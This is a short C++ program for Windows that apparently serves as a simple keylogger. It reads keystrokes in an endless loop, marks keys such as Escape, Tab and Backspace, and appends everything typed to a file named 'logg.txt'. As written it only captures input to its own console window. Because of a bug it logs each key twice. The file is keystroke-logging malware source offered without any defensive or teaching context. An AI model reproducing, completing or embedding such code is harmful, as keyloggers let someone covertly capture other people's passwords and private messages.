#include <iostream>
#include <windows.h>    // importing windows function
#include <conio.h>      // console input-output
#include <fstream>      // file input-output stream
using namespace std;

int log_key(char key, fstream &file)
{
    file.open("logg.txt",ios::app| ios::in | ios::out);
    if (!file.is_open())
    {

        cout<<"File open error"<<endl;
        return 0;
    }
    if(GetAsyncKeyState(VK_ESCAPE))
    {
        file<<"[ESCAPE]";
    }
    else if(GetAsyncKeyState(VK_DELETE))
    {
        file<<"[DELETE]";
    }
    else if(GetAsyncKeyState(VK_TAB))
    {
        file<<"[TAB]";
    }
    else if(GetAsyncKeyState(VK_SPACE))
    {
        file<<"[SPACE]";
    }
    else if(GetAsyncKeyState(VK_BACK)){
        file << "[BACKSPACE]";
    }
    else
    {

        file << key;

    }
    file.close();
    return 1;
}

int main()
{
    fstream File{"logg.txt"};
    char keypress{};
    //File.open("logg.txt", ios::app);
    while(true)
    {
        keypress = getch();

        int success = log_key(keypress, File);
        if(success)
        {
            log_key(keypress, File);
        }
    else
    {
        cout<<"Logging not working"<<endl;
        }
    }
    return 0;
}
